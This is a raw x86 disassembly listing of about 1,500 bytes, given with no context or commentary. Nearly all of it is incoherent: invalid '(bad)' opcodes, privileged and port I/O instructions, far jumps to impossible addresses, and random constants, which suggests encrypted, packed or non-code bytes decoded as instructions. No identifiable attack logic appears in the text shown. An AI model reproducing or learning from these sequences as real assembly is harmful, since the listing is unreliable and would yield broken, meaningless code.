  426fbe:	stos   DWORD PTR es:[edi],eax
  426fbf:	jmp    0x43a6:0xe7a099c9
  426fc6:	push   ebp
  426fc7:	ret    0x42c1
  426fca:	push   eax
  426fcb:	dec    edx
  426fcc:	in     eax,dx
  426fcd:	aam    0x43
  426fcf:	jno    0x426f8b
  426fd1:	stos   BYTE PTR es:[edi],al
  426fd2:	cmc    
  426fd3:	stos   BYTE PTR es:[edi],al
  426fd4:	inc    esp
  426fd5:	pop    es
  426fd6:	rcl    BYTE PTR [ebx],1
  426fd8:	dec    ecx
  426fd9:	sahf   
  426fda:	sub    al,0x7c
  426fdc:	jb     0x427042
  426fde:	sub    al,0x2
  426fe0:	inc    ebx
  426fe1:	or     BYTE PTR [esi-0x54],bh
  426fe4:	mov    ebx,0xb80a1fb2
  426fe9:	xchg   edx,eax
  426fea:	add    al,0xc
  426fec:	inc    ecx
  426fed:	or     eax,0x3be9daa1
  426ff2:	fs jbe 0x42706b
  426ff5:	sub    ebx,ebp
  426ff7:	fwait
  426ff8:	inc    eax
  426ff9:	fdiv   DWORD PTR [edx-0x4fa05df9]
  426fff:	inc    ebx
  427000:	push   cs
  427001:	loop   0x427009
  427003:	cld    
  427004:	pop    edi
  427005:	inc    ebx
  427006:	mov    al,0x3b
  427008:	dec    esi
  427009:	(bad)  
  42700a:	call   0xf11:0xf14a1b26
  427011:	lds    edi,FWORD PTR [esi]
  427013:	sahf   
  427014:	sub    eax,0xf41e6982
  427019:	push   ds
  42701a:	rcr    DWORD PTR [ebx+esi*1-0x33],cl
  42701e:	inc    ebp
  42701f:	scas   eax,DWORD PTR es:[edi]
  427020:	pusha  
  427021:	ss repz jne 0x42703f
  427025:	push   esp
  427026:	or     BYTE PTR [esi+0x75],0x7d
  42702a:	daa    
  42702b:	fistp  WORD PTR ds:0xf243647d
  427031:	out    dx,eax
  427032:	adc    ch,ch
  427034:	inc    eax
  427035:	gs icebp 
  427037:	jno    0x426fce
  427039:	fist   WORD PTR [esi]
  42703b:	fcom   st(4)
  42703d:	hlt    
  42703e:	ficomp DWORD PTR [ebx+0x73]
  427041:	arpl   di,si
  427043:	call   0x68ea4d66
  427048:	rol    DWORD PTR [ecx+eiz*4-0x2f3a0279],cl
  42704f:	push   cs
  427050:	out    dx,al
  427051:	or     al,BYTE PTR [ecx+0x30]
  427054:	cdq    
  427055:	add    al,BYTE PTR [ebx]
  427057:	adc    eax,0x2f455890
  42705c:	sti    
  42705d:	(bad)  
  42705f:	push   esi
  427060:	lock aad 0x62
  427063:	cdq    
  427064:	mov    dl,0xc3
  427066:	add    DWORD PTR [ebp-0x7963c9d],esi
  42706c:	jne    0x42704e
  42706e:	push   es
  42706f:	mov    WORD PTR ds:0x1f182d94,cs
  427075:	ret    0x486c
  427078:	mov    dl,dl
  42707a:	shl    ch,0x72
  42707d:	sub    ecx,esp
  42707f:	sbb    DWORD PTR [esi],edx
  427081:	cmp    eax,0xd6096a90
  427086:	sub    DWORD PTR [edi],esi
  427088:	dec    ecx
  427089:	sahf   
  42708a:	ret    0x9a2b
  42708d:	jae    0x427088
  42708f:	iret   
  427090:	(bad)  
  427091:	in     eax,0xdf
  427093:	dec    edx
  427094:	and    edi,DWORD PTR [ebx]
  427096:	pop    edi
  427097:	push   ebx
  427098:	out    dx,al
  427099:	and    ebp,edx
  42709b:	pop    esi
  42709c:	sbb    BYTE PTR [edx-0x46],al
  42709f:	add    BYTE PTR [ebx+0x62],al
  4270a2:	mov    ebp,0x483a4b5a
  4270a7:	repnz in al,dx
  4270a9:	fwait
  4270aa:	jb     0x427051
  4270ac:	in     eax,0xb6
  4270ae:	pop    es
  4270af:	retf   
  4270b0:	cmp    al,0x23
  4270b2:	sub    eax,0x1f70225b
  4270b7:	loopne 0x42711f
  4270b9:	pop    es
  4270ba:	xchg   ebp,eax
  4270bb:	ins    DWORD PTR es:[edi],dx
  4270bc:	mov    ds:0x62cb644d,al
  4270c1:	jmp    0x11a:0xfa85939d
  4270c8:	fisttp DWORD PTR [esi]
  4270ca:	out    dx,al
  4270cb:	push   ss
  4270cc:	(bad)  [eax+0x8]
  4270cf:	adc    al,0xa7
  4270d1:	inc    edx
  4270d2:	jne    0x42709e
  4270d4:	mov    dh,0xa8
  4270d6:	repz jne 0x427101
  4270d9:	test   DWORD PTR [edi-0x12],esi
  4270dc:	retf   
  4270dd:	(bad)  
  4270de:	push   ecx
  4270df:	or     al,0xe3
  4270e1:	pop    es
  4270e2:	jne    0x4270df
  4270e4:	push   esi
  4270e5:	mov    esi,0x2730109f
  4270ea:	pop    ebx
  4270eb:	mov    ecx,0x7bbe4c1e
  4270f0:	pop    ds
  4270f1:	jns    0x427073
  4270f3:	mov    esp,0x2bb26d9
  4270f8:	ret    
  4270f9:	sbb    BYTE PTR fs:[ebp+0x46],dl
  4270fd:	shl    WORD PTR [eax+0x60ba5684],0x97
  427105:	sub    eax,0x6bdd49e4
  42710a:	jno    0x427170
  42710c:	xchg   ebx,eax
  42710d:	ja     0x42710c
  42710f:	dec    edx
  427110:	push   eax
  427111:	adc    BYTE PTR [eax+edx*8],bh
  427114:	leave  
  427115:	push   ss
  427116:	frstor [esi+0x34fa8b21]
  42711c:	inc    ebx
  42711d:	jnp    0x427178
  42711f:	add    cl,BYTE PTR [ecx+0x18]
  427122:	sub    BYTE PTR [edx+0x5e],dl
  427125:	mov    dh,0x7c
  427127:	push   cs
  427128:	mov    edx,0x69df0eea
  42712d:	mov    esi,0xf3ca1d5c
  427132:	lods   eax,DWORD PTR ds:[esi]
  427133:	pop    es
  427134:	ror    BYTE PTR [edx-0x2ea40600],0xf7
  42713b:	push   es
  42713c:	or     ch,ch
  42713e:	inc    ebp
  42713f:	pop    ds
  427140:	push   edx
  427141:	into   
  427142:	stos   BYTE PTR es:[edi],al
  427143:	pop    esp
  427144:	adc    esi,DWORD PTR [ebx+edx*4+0x62]
  427148:	push   es
  427149:	fwait
  42714a:	lds    ebp,FWORD PTR ds:0x7fcbb2a0
  427150:	ja     0x42716e
  427152:	or     al,0x82
  427154:	or     eax,0xb42fc04
  427159:	nop
  42715a:	or     al,0x9e
  42715c:	inc    ebx
  42715d:	sti    
  42715e:	dec    ebp
  42715f:	and    eax,DWORD PTR [ebp-0x7608537c]
  427165:	pop    ds
  427166:	add    cl,BYTE PTR [esi-0x40143833]
  42716c:	test   BYTE PTR [eax+0x3335c7c9],bl
  427172:	adc    ah,BYTE PTR [esi]
  427174:	sub    esi,edi
  427176:	sub    bl,BYTE PTR [ebx]
  427178:	stos   DWORD PTR es:[edi],eax
  427179:	cmp    eax,0xbdc9f3de
  42717e:	repz mov dl,0xc0
  427181:	sbb    DWORD PTR [ebx-0x7f907c5e],eax
  427187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427188:	loop   0x4271f0
  42718a:	sub    BYTE PTR [ebp+ecx*4+0x17],bh
  42718e:	cmp    DWORD PTR [esi+0xb2318d5],eax
  427194:	stc    
  427195:	or     eax,0x2612be2d
  42719a:	jb     0x427192
  42719c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42719d:	sti    
  42719e:	fld    DWORD PTR [esi]
  4271a0:	xchg   ebp,eax
  4271a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271a2:	or     DWORD PTR [eax+0x2a],esi
  4271a5:	dec    ebx
  4271a6:	jb     0x4271f1
  4271a8:	or     bh,ch
  4271aa:	dec    edx
  4271ab:	xor    DWORD PTR ds:0x8231d2e0,esp
  4271b1:	sub    ecx,DWORD PTR [edx-0x78]
  4271b4:	popa   
  4271b5:	sub    BYTE PTR [edi+0x19],bh
  4271b8:	loop   0x427145
  4271ba:	dec    esi
  4271bb:	push   ds
  4271bc:	ins    BYTE PTR es:[edi],dx
  4271bd:	cli    
  4271be:	popa   
  4271bf:	pop    esi
  4271c0:	cmp    DWORD PTR [edx+eax*2-0x7873ce64],ebx
  4271c7:	test   BYTE PTR [edi+0x3e],al
  4271ca:	or     ebx,eax
  4271cc:	xor    al,0xe1
  4271ce:	fiadd  WORD PTR [ebp-0x734a1270]
  4271d4:	jbe    0x42721d
  4271d6:	neg    bl
  4271d8:	inc    esp
  4271d9:	pop    ebp
  4271da:	int3   
  4271db:	in     eax,0x25
  4271dd:	jo     0x4271ca
  4271df:	fcmovnb st,st(2)
  4271e1:	and    dh,BYTE PTR [esi+0x4542f457]
  4271e7:	mov    esi,0x3ce25920
  4271ec:	aad    0x5a
  4271ee:	dec    ebp
  4271ef:	xor    BYTE PTR [esi-0x7f],0x80
  4271f3:	cmp    al,0x6e
  4271f5:	push   edi
  4271f6:	hlt    
  4271f7:	mov    DWORD PTR [ebx],ecx
  4271f9:	or     al,ch
  4271fb:	cdq    
  4271fc:	mov    ch,0x6a
  4271fe:	(bad)  
  4271ff:	cdq    
  427200:	push   cs
  427201:	sti    
  427202:	es mov bl,0xac
  427205:	ins    DWORD PTR es:[edi],dx
  427206:	add    al,0x9a
  427208:	jb     0x4271b1
  42720a:	inc    ecx
  42720b:	jb     0x4271ca
  42720d:	push   ecx
  42720e:	sbb    al,0x17
  427210:	rcl    dh,0x15
  427213:	sbb    al,BYTE PTR [edx]
  427215:	fcomip st,st(3)
  427217:	mov    bl,0x56
  427219:	sbb    bl,BYTE PTR [edx+ecx*1]
  42721c:	sub    bl,cl
  42721e:	aaa    
  42721f:	jmp    0x0:0xf49357c0
  427226:	add    BYTE PTR [eax],al
  427228:	add    BYTE PTR [eax],al
  42722a:	dec    ebp
  42722b:	push   ebp
  42722c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427232:	mov    esp,ebp
  427234:	or     al,ah
  427236:	dec    ebp
  427237:	add    bh,al
  427239:	add    BYTE PTR [eax],cl
  42723b:	add    BYTE PTR [eax],al
  42723d:	mov    DWORD PTR [eax],0x3ef44545
  427243:	cmp    BYTE PTR [eax],al
  427245:	test   DWORD PTR [ebx-0x34070b64],ecx
  42724b:	(bad)  
  42724c:	enter  0x4d45,0xb8
  427250:	mov    edi,DWORD PTR [ecx]
  427252:	hlt    
  427253:	test   ebx,ecx
  427255:	pushf  
  427256:	enter  0x4df8,0x8b
  42725a:	mov    DWORD PTR [ebp+0x8],0x894708
  427261:	inc    ebp
  427262:	mov    ebp,0xff8bfffc
  427267:	dec    ebp
  427268:	mov    ch,0xf4
  42726a:	call   DWORD PTR [ebx-0x1]
  42726d:	mov    ebx,0x8005022
  427272:	call   DWORD PTR [ecx+0x8]
  427275:	pop    es
  427276:	jmp    0xb8:0x9cb4533
  42727d:	cwde   
  42727e:	mov    esi,DWORD PTR [edx-0xc]
  427281:	xor    al,bl
  427283:	add    BYTE PTR [eax+0x3c83203],bl
  427289:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  42728f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  427295:	xor    eax,DWORD PTR [eax]
  427297:	retf   
  427298:	ret    
  427299:	add    eax,esi
  42729b:	enter  0x8945,0x64
  42729f:	dec    ebp
  4272a0:	sbb    ah,cl
  4272a2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272a8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ae:	test   DWORD PTR [ebx],esi
  4272b0:	dec    ebx
  4272b2:	inc    DWORD PTR [ebx]
  4272b4:	inc    eax
  4272b5:	enter  0x8989,0x64
  4272b9:	(bad)  
  4272ba:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272be:	cld    
  4272bf:	dec    DWORD PTR [ebp-0xa90001]
  4272c5:	push   edi
  4272c6:	mov    BYTE PTR [edx+0x1],ch
  4272c9:	and    BYTE PTR [eax],al
  4272cb:	pop    ecx
  4272cc:	inc    ebp
  4272cd:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272d3:	push   0xffffff89
  4272d5:	pop    ecx
  4272d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272d7:	dec    ebp
  4272d8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272de:	jne    0x427328
  4272e0:	lea    eax,[eax]
  4272e2:	fs (bad) 
  4272e4:	dec    DWORD PTR [eax]
  4272e6:	mov    DWORD PTR [eax],eax
  4272e8:	test   al,0x0
  4272ea:	add    BYTE PTR [ebp-0x18],cl
  4272ed:	xor    ebp,DWORD PTR [edx]
  4272ef:	add    eax,DWORD PTR [eax]
  4272f1:	mov    eax,eax
  4272f3:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4272fa:	inc    ebp
  4272fb:	mov    DWORD PTR [ebx+0x459408],ecx
  427301:	popa   
  427302:	mov    esp,DWORD PTR [ebp-0x75]
  427305:	(bad)  
  427306:	cld    
  427307:	inc    eax
  427308:	cmp    bh,0x1
  42730b:	lea    eax,[eax]
  42730d:	and    BYTE PTR [eax],al
  42730f:	inc    DWORD PTR [ecx-0x18]
  427312:	mov    ecx,DWORD PTR [ebx]
  427314:	cld    
  427315:	add    BYTE PTR [ecx+0x75014d],cl
  42731b:	(bad)  
  42731c:	xchg   ebp,eax
  42731d:	sar    bh,1
  42731f:	inc    eax
  427320:	inc    DWORD PTR [eax]
  427322:	mov    eax,DWORD PTR [ebp-0x4]
  427325:	xor    edx,DWORD PTR [edx+0x7201be]
  42732b:	add    BYTE PTR [edx],dl
  42732d:	(bad)  
  42732e:	nop
  42732f:	inc    ebp
  427330:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427336:	mov    al,0xff
  427338:	add    bh,bh
  42733a:	add    BYTE PTR [ebx],dh
  42733c:	inc    DWORD PTR [ebx]
  42733e:	sbb    al,0x89
  427340:	jne    0x42731e
  427342:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427348:	mov    eax,DWORD PTR [ebp-0xff0048]
  42734e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427355:	inc    DWORD PTR [ebp-0x75]
  427358:	fisttp QWORD PTR [eax+ebp*8]
  42735b:	test   DWORD PTR [esi-0x1],esp
  42735e:	inc    ebp
  42735f:	(bad)  
  427360:	aas    
  427361:	inc    ebp
  427362:	(bad)  
  427363:	lea    edi,[eax+edi*2-0x1]
  427367:	inc    edi
  427369:	mov    DWORD PTR ds:0x8000c7a0,edi
  42736f:	mov    ebp,esi
  427371:	cld    
  427372:	in     al,0x8d
  427374:	inc    ebp
  427375:	(bad)  
  427376:	call   0xc7cb537a
  42737b:	add    DWORD PTR [eax-0x11ba1500],ecx
  427381:	inc    DWORD PTR [ebp-0x4]
  427384:	out    0x8d,eax
  427386:	aas    
  427387:	(bad)  
  427388:	call   0xca9e8c
  42738d:	add    DWORD PTR [ebx-0x7f570400],ecx
  427393:	add    BYTE PTR [ecx],al
  427395:	test   DWORD PTR [eax],eax
  427397:	wrmsr  
  427399:	jae    0x427388
  42739b:	add    BYTE PTR [eax],al
  42739d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273a3:	add    esp,edi
  4273a5:	add    BYTE PTR [eax+0x450108],al
  4273ab:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ae:	add    DWORD PTR [eax],0x4
  4273b1:	mov    eax,DWORD PTR [ebp+0x3]
  4273b4:	mov    edi,DWORD PTR [esp+edi*8]
  4273b7:	dec    ebp
  4273b8:	nop
  4273b9:	mov    eax,DWORD PTR [ecx]
  4273bb:	fadd   DWORD PTR [eax]
  4273bd:	add    BYTE PTR [esi],al
  4273bf:	lea    eax,[eax]
  4273c1:	pusha  
  4273c2:	push   eax
  4273c3:	inc    DWORD PTR [ebp+0x52]
  4273c6:	call   DWORD PTR [ebp-0x7b]
  4273c9:	mov    esi,DWORD PTR [ebp-0x74]
  4273cc:	mov    eax,DWORD PTR [eax]
  4273ce:	cld    
  4273cf:	mov    eax,DWORD PTR [eax+0x880103]
  4273d5:	add    BYTE PTR [ebp+0x6a],bh
  4273d8:	cmp    edi,0x10
  4273db:	mov    WORD PTR [ebp+0x0],es
  4273de:	mov    edx,DWORD PTR [edx-0x4]
  4273e1:	push   ecx
  4273e2:	nop
  4273e3:	inc    DWORD PTR [ecx]
  4273e5:	cld    
  4273e6:	add    BYTE PTR [ebp-0x24],bh
  4273e9:	mov    eax,DWORD PTR [eax]
  4273eb:	cld    
  4273ec:	push   eax
  4273ed:	nop
  4273ee:	inc    ebp
  4273ef:	add    edi,edi
  4273f1:	add    BYTE PTR [ebx+0x4de4f445],cl
  4273f7:	in     al,dx
  4273f8:	xor    eax,edi
  4273fa:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427401:	mov    DWORD PTR [eax],0xb8788b98
  427407:	test   ebx,eax
  427409:	jmp    FWORD PTR [eax-0x1]
  42740c:	int    0xed
  42740e:	sub    esp,eax
  427410:	add    eax,DWORD PTR [ebp-0x30]
  427413:	fild   WORD PTR [ebp+0x3f]
  427416:	cmp    eax,edi
  427418:	je     0xca43543a
  42741e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427425:	(bad)  
  427426:	jne    0x4273b4
  427428:	mov    ebx,ebp
  42742a:	cld    
  42742b:	js     0x427472
  42742d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427433:	inc    ebp
  427434:	call   0xea9dc4
  427439:	add    BYTE PTR [ebx-0x7f170301],cl
  42743f:	add    DWORD PTR es:[eax],eax
  427442:	add    al,al
  427444:	xor    BYTE PTR [eax+0x41],dl
  427447:	inc    ebp
  427448:	add    BYTE PTR [ebx+0xfcd88b],cl
  42744e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427454:	add    DWORD PTR [ecx+0x458be845],ecx
  42745a:	fmul   DWORD PTR [ebx+0x8bb800]
  427460:	cld    
  427461:	call   0xd79f26
  427466:	dec    DWORD PTR [ebx+0x1090e8ff]
  42746c:	add    al,al
  42746e:	push   eax
  42746f:	es inc ebp
  427471:	inc    ebp
  427472:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427478:	dec    DWORD PTR [ebx-0x3ff70301]
  42747e:	mov    DWORD PTR gs:[eax],eax
  427481:	call   0x8b6aba46
  427486:	inc    ebp
  427487:	mov    eax,0xe8d8008b
  42748c:	add    BYTE PTR [ecx],ch
  42748e:	mov    eax,DWORD PTR [eax]
  427490:	cld    
  427491:	mov    eax,eax
  427493:	call   0x462a84ed
  427498:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42749e:	cld    
  42749f:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274a6:	xor    BYTE PTR [eax],al
  4274a8:	push   edi
  4274a9:	inc    ebp
  4274aa:	mov    DWORD PTR [ebx],esi
  4274ac:	in     al,0xb9
  4274ae:	inc    ebp
  4274af:	lea    ecx,[ebx-0x3c370301]
  4274b5:	dec    ebp
  4274b6:	cwde   
  4274b7:	mov    esi,DWORD PTR [edx]
  4274b9:	or     BYTE PTR [ebx],al
  4274bb:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274c2:	call   0x429e0c
  4274c7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274cd:	jge    0x427502
  4274cf:	mov    eax,DWORD PTR [ebx]
  4274d1:	cld    
  4274d2:	lea    edx,[eax+0xff0120]
  4274d8:	call   0x429e6c
  4274dd:	push   eax
  4274de:	inc    DWORD PTR [ebp-0x1c]
  4274e1:	mov    ecx,DWORD PTR [ebp-0x58]
  4274e4:	xor    eax,DWORD PTR [eax]
  4274e6:	add    edi,edi
  4274e8:	cmp    ebp,eax
  4274ea:	jne    0x427512
  4274ec:	mov    DWORD PTR [eax],0x8b004dd8
  4274f2:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4274f9:	mov    eax,ebx
  4274fb:	cld    
  4274fc:	test   BYTE PTR [eax+0x320198],bh
  427502:	mov    DWORD PTR [ebp+0x8],esi
  427505:	xor    eax,DWORD PTR [ebp-0x73]
  427508:	test   DWORD PTR [esp+esi*2-0x1],edi
  42750c:	mov    ebp,eax
  42750e:	mov    eax,0x33004d29
  427513:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427519:	add    DWORD PTR [eax],eax
  42751b:	add    BYTE PTR [ebp+0x30],al
  42751e:	mov    edx,DWORD PTR [edi-0x48]
  427521:	add    ebx,0xffffffe4
  427524:	push   0x2b74cd85
  427529:	mov    eax,DWORD PTR [ebx]
  42752b:	cld    
  42752c:	sar    BYTE PTR [eax+0x3b0145],1
  427532:	pcmpeqw mm4,mm6
  427535:	xor    edi,edi
  427537:	lea    ecx,[ebx-0x239c7470]
  42753d:	add    BYTE PTR [ebp+0x50],cl
  427540:	cmp    eax,DWORD PTR [ebp+0x75]
  427543:	mov    ebp,DWORD PTR [eax-0x68]
  427546:	test   DWORD PTR [eax],eax
  427548:	clc    
  427549:	push   DWORD PTR [ebp-0x1]
  42754c:	lea    ecx,[eax]
  42754e:	int3   
  42754f:	inc    ebp
  427550:	call   0xfaa5e0
  427555:	jne    0x42754f
  427557:	xor    edi,DWORD PTR [ebp-0x41]
  42755a:	jmp    0x4275ce
  42755c:	mov    eax,DWORD PTR [eax]
  42755e:	mov    eax,0x339545c7
  427563:	inc    DWORD PTR [ebx]
  427565:	push   DWORD PTR [ecx]
  427567:	aaa    
  427568:	mov    eax,DWORD PTR [eax]
  42756a:	jmp    0x4275bc
  42756c:	mov    eax,DWORD PTR [ebp-0x3c]
  42756f:	mov    eax,eax
  427571:	cld    
  427572:	clc    
  427573:	ret    
  427574:	test   bh,al
  427576:	pop    es
  427577:	xchg   ebp,eax
  427578:	add    bh,bh
  42757a:	inc    ebp
  42757b:	dec    DWORD PTR [edi]
  42757d:	and    DWORD PTR [ebx],ebp
  42757f:	add    BYTE PTR [eax],al
  427581:	push   eax
  427582:	jbe    0x4275d9
  427584:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42758a:	or     al,0xcf
  42758c:	inc    eax
  42758d:	enter  0x745,0x72
  427591:	inc    ebp
  427592:	mov    eax,DWORD PTR [ecx]
  427594:	int3   
  427595:	add    BYTE PTR [ebp-0x75],al
  427598:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42759e:	ror    BYTE PTR [ebp+0x72f80885],1
  4275a4:	inc    ebp
  4275a5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275ab:	fadd   st,st(6)
  4275ad:	rol    BYTE PTR [ebp+0x12],0x8b
  4275b1:	inc    ebp
  4275b2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275b8:	inc    ebp
  4275b9:	test   bh,al
  4275bb:	cwde   
  4275bc:	clc    
  4275bd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275c3:	inc    ebp
  4275c4:	cmp    dh,BYTE PTR [ebx]
  4275c6:	pushf  
  4275c7:	mov    ecx,0xffb48dc7
  4275cc:	test   eax,ecx
  4275ce:	clc    
  4275cf:	dec    ebp
  4275d0:	inc    ebp
  4275d1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275d4:	pushf  
  4275d5:	rol    edi,0x86
  4275d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275d9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275df:	inc    ebp
  4275e0:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  4275e8:	test   DWORD PTR [eax],edi
  4275ea:	clc    
  4275eb:	pushf  
  4275ec:	inc    ebp
  4275ed:	dec    DWORD PTR [ebx-0x3cba0f04]
  4275f3:	push   eax
  4275f4:	(bad)  
  4275f5:	cld    
  4275f6:	jge    0x4275f8
  4275f8:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4275fe:	add    BYTE PTR [ebx],dl
  427600:	jmp    0xcd7752
  427605:	les    eax,FWORD PTR [ebp-0x35]
  427608:	mov    ecx,esi
  42760a:	lock or al,cl
  42760d:	clc    
  42760e:	inc    ebp
  42760f:	add    esi,DWORD PTR [ebx]
  427611:	jge    0x427616
  427613:	xor    edi,DWORD PTR [ebx]
  427615:	cmp    ecx,DWORD PTR [edi]
  427617:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42761c:	mov    edi,DWORD PTR [ecx]
  42761e:	test   al,0xcc
  427620:	dec    ebp
  427621:	test   BYTE PTR [ebx],dh
  427623:	pop    es
  427624:	xor    eax,DWORD PTR [eax]
  427626:	add    ecx,DWORD PTR [esi]
  427628:	add    ecx,eax
  42762a:	psraw  mm0,mm1
  42762d:	sub    BYTE PTR [ebp+0x38],cl
  427630:	mov    edi,DWORD PTR [ebx]
  427632:	lock int3 
  427634:	shl    edx,1
  427636:	rol    BYTE PTR [ebp+0xc],1
  427639:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427640:	jmp    0x7b768a
  427645:	pushf  
  427646:	inc    ebp
  427647:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42764d:	xor    ecx,ebx
  42764f:	add    ecx,esi
  427651:	mov    esi,eax
  427653:	enter  0x45af,0x8b
  427657:	xor    ecx,eax
  427659:	add    edx,DWORD PTR [ebp-0x77]
  42765c:	sub    ecx,DWORD PTR [eax]
  42765e:	cmp    eax,DWORD PTR [ebp+0x77]
  427661:	fmul   DWORD PTR [ebx-0x76385764]
  427667:	test   al,0x0
  427669:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42766f:	cmp    esi,DWORD PTR [ebx]
  427671:	pushf  
  427672:	xor    eax,edi
  427674:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42767b:	inc    ebp
  42767c:	dec    ebp
  42767d:	cmp    eax,0xc7f09c8b
  427682:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427689:	inc    ebp
  42768a:	jmp    0x4276cb
  42768c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427693:	dec    ebp
  427694:	xor    esi,DWORD PTR [ebx]
  427696:	add    eax,DWORD PTR [ebx]
  427698:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42769e:	dec    ebp
  42769f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276a5:	out    dx,eax
  4276a6:	rol    BYTE PTR [eax],1
  4276a8:	add    eax,0xebc8458b
  4276ad:	dec    ebp
  4276ae:	mov    ebp,DWORD PTR [ebx]
  4276b0:	mov    esp,0x33f84d8b
  4276b5:	ret    
  4276b6:	xor    eax,esi
  4276b8:	add    ecx,eax
  4276ba:	add    eax,DWORD PTR [edx+0xc1010f]
  4276c0:	dec    ebp
  4276c1:	inc    ebp
  4276c2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276c8:	ror    bl,1
  4276ca:	add    eax,0xebc645ce
  4276cf:	scas   eax,DWORD PTR es:[edi]
  4276d0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276d6:	xor    ebp,DWORD PTR [ebx]
  4276d8:	xor    edi,DWORD PTR [ebx]
  4276da:	add    esi,DWORD PTR [edi+0x3]
  4276dd:	mov    ecx,DWORD PTR [edi]
  4276df:	clc    
  4276e0:	rol    ebx,0x4d
  4276e3:	(bad)  
  4276e4:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4276eb:	mov    ah,0x45
  4276ed:	dec    ebp
  4276ee:	jbe    0x427723
  4276f0:	mov    esi,DWORD PTR [ebx]
  4276f2:	call   0x3345c3fa
  4276f7:	rdpmc  
  4276f9:	rol    DWORD PTR [ebx],0x4d
  4276fc:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427702:	inc    ebp
  427703:	ror    BYTE PTR [ebx+0x45450808],1
  427709:	jmp    0x10a7799
  42770e:	inc    ebp
  42770f:	inc    ebp
  427710:	(bad)  
  427711:	mov    ebx,eax
  427713:	clc    
  427714:	test   ebx,eax
  427716:	clc    
  427717:	retf   
  427718:	inc    ebp
  427719:	into   
  42771a:	mov    esi,0x8b85afec
  427720:	clc    
  427721:	enter  0x5545,0x3a
  427725:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42772c:	ret    
  42772d:	mov    ah,0xc6
  42772f:	addr16 push 0x338b4545
  427735:	clc    
  427736:	add    eax,ebx
  427738:	loopne 0x427705
  42773a:	dec    ebp
  42773b:	into   
  42773c:	mov    al,dh
  42773e:	or     BYTE PTR [edi-0x37ff748e],ch
  427744:	inc    ebp
  427745:	push   ebp
  427746:	mov    ebp,DWORD PTR [ebx]
  427748:	in     al,dx
  427749:	cmp    eax,ebx
  42774b:	ja     0x427792
  42774d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427753:	inc    ebp
  427754:	cwde   
  427755:	mov    esi,DWORD PTR [edx]
  427757:	clc    
  427758:	mov    bl,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	retf   
  42775c:	inc    ebp
  42775d:	into   
  42775e:	mov    eax,esi
  427760:	in     al,dx
  427761:	scas   eax,DWORD PTR es:[edi]
  427762:	retf   
  427763:	mov    ecx,DWORD PTR [ebp-0x38]
  427766:	mov    edx,DWORD PTR [ebp-0x24]
  427769:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427770:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427777:	mov    eax,DWORD PTR [ebx]
  427779:	clc    
  42777a:	loopne 0x42773f
  42777c:	push   ebp
  42777d:	retf   
  42777e:	mov    dh,al
  427780:	adc    esi,ecx
  427782:	jb     0x427733
  427784:	add    BYTE PTR [ebx+0x558bc845],cl
  42778a:	in     al,dx
  42778b:	sub    eax,ebx
  42778d:	cmp    ecx,ebx
  42778f:	mov    eax,esi
  427791:	mov    esp,0x45af03ce
  427796:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42779c:	mov    eax,ebx
  42779e:	in     al,dx
  42779f:	into   
  4277a0:	dec    ebp
  4277a1:	(bad)  
  4277a2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277a8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277ac:	xor    esp,esp
